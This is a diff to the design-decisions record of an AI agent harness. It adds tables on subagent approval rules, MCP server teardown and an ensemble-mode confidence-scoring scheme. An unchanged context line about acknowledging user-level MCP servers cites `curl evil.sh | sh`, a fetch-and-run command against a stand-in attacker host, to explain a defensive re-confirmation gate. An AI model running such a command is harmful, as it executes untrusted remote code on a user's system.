@@ -61,6 +61,47 @@ Every decision below was made through a structured clarification cycle with the 
 | D30 | **(Rev. 4)** `mcp.json` validation is by connection, not by schema | Unrecognized keys are accepted and ignored (DEBUG-logged); a server is validated by connecting and calling `list_tools()`; per-server failures are named and skipped, never fatal | `settings.json` raises on unknown keys (§14 amendment 1) because every one of its keys changes behavior. `mcp.json` is routinely shared with Claude Desktop, Cursor and others, which carry keys this harness doesn't implement — failing startup over a decorative key is worse than ignoring it. What we can't understand about *what executes* still surfaces, as that server's connect failure. One stale entry must never make the harness unusable. |
 | D31 | **(Rev. 4)** User-level MCP servers are acknowledged once | First time a user-level server is seen, show the command it will run and confirm; store name → hash of its config entry, so an edited command re-asks | Project-level servers are covered by D17. User-level ones had no gate at all, on the assumption you authored them — which is exactly wrong when an installer or another tool appended to the file. Content-hash keying is D17's pattern reused, so an acknowledgement of `npx pkg` can't silently carry over to `curl evil.sh \| sh` under the same name. |
 
+### Decisions record — S1–S4 (the §14–§18 review's fix pass)
+
+The §14–§18 review found 65 issues; four of its fixes needed a decision rather
+than a correction. They are cited from `agents/`, `mcp_client/` and `core/`, and
+they amend §18 and §17 rather than belonging to a section of their own — which is
+why they sit here with `D1`–`D31` instead of under a section heading.
+`DEVLOG.md`'s §14–§18 review pass records the same four in narrative form.
+
+| # | Decision |
+|---|---|
+| **S1** | **Subagent sign-off, all-or-nothing, per turn.** Approving a spawn authorises the child's whole approval-gated set for the rest of the turn. Per-tool selection is deferred to §23's response channel and recorded there as a named consumer. |
+| **S2** | **The parent's approval tightenings union into the child.** Only `True` entries carry, since a `False` is indistinguishable from absent under D14's OR — so unioning can only tighten. **This amends §18's locked sketch**, which shows `approval_overrides=agent_def.approval_overrides` verbatim; C6 reasoned about `allowed_tools` and never considered the approval axis. |
+| **S3** | **MCP teardown by exact name, not by prefix.** `mcp__<server>__<tool>` cannot be taken apart again — neither `__` in a server name nor in a tool name is illegal. Registration records what it registered. No `mcp.json` content is rejected up front, so decision G stands. |
+| **S4** | **One central effort validator, cached.** A network call at startup is acceptable; on lookup failure the requested level passes through unverified with a WARNING rather than being dropped, and the failure is not cached. |
+
+**Do not confuse these with the audit's severity grades.** Findings in Audit
+Pass 1 are graded `S1` (worst) to `S4`, and `ROADMAP_v2.md` cites those grades in
+§30–§35. A bare `S1` in a section written *about* the audit is a severity; a bare
+`S1` anywhere else is the decision above. See the namespace list in `AGENTS.md`.
+
+### Decisions record — E1–E12 (ensemble mode, ROADMAP.md §10's revisit)
+
+Ensemble mode is §10's subject and its revisit note lives in `ROADMAP.md`, but its
+decisions are cited from `config.py` and four files under `core/reasoning/`, so
+they belong in the record with everything else rather than in a note about a note.
+
+| # | Decision |
+|---|---|
+| E1 | Diversity from different MODELS. `config.ENSEMBLE_MODELS`, entries `{provider_name, model}`. Deviates from §10's own note; see above. |
+| E2 | `config.py` only, following `CRITIC_MODEL`. `ensemble_models` is rejected from `settings.json` **by name** — R12's rule applied to a second kind of authority. Turning the mode on can only spend more of the provider the user already chose; a *roster* chooses providers, and a project's `settings.json` beats the user's. §14 already flagged project-tier provider selection as its own grant; this is that grant times N. |
+| E3 | N is `len(ENSEMBLE_MODELS)`, derived. A separately configured count could disagree with the roster that produced the candidates, and a confidence score's denominator must not be able to lie. |
+| E4 | `ensemble_n` stays a known settings key and a pipeline parameter, vestigial, with a WARNING when set. Removing the key would make every existing `settings.json` that sets it **raise** — unknown keys raise by design. |
+| E5 | Refuse on fewer than 2 **distinct** `(provider, model)` pairs. The load-bearing guard: `[X, X, X]` recreates §16's exact defect through the new config. |
+| E6 | API keys are not pre-validated; validation is by connecting. Matches §16's `/model` (warns on an empty `API_KEY` so a local endpoint stays usable) and MCP's per-server posture. |
+| E7 | A failed candidate is named, traced and skipped; the denominator is the number that produced text. One survivor **degrades to the single-candidate path** rather than being scored as an ensemble of one, which would report unanimous corroboration from a single source. All candidates failing is an error. |
+| E8 | Consistency enters as a **disagreement penalty**: `raw -= 0.15 * (1 - consistency)`, factual claims only, subtracted like `ASSUMPTION_FLAG_PENALTY`. Unanimity is free, dissent subtracts. |
+| E9 | Non-factual claims untouched. §10 decided consistency does not *rescue* them from the cap; whether dissent should *penalise* a speculative claim is a different judgment and was never made. |
+| E10 | `score_claim` rounds once, then uses that value for both the tier and the breakdown. |
+| E11 | Candidate labels follow the **survivors**, never roster position. |
+| E12 | No new `Claim` field, no new `PipelineRun` field, no schema change. The denominator goes in the existing `score_breakdown` (§20's precedent, which put tier overrides there to avoid migrating every `vars(c)` site); the roster goes in `run.trace`. |
+
 ---
 
 ## Index
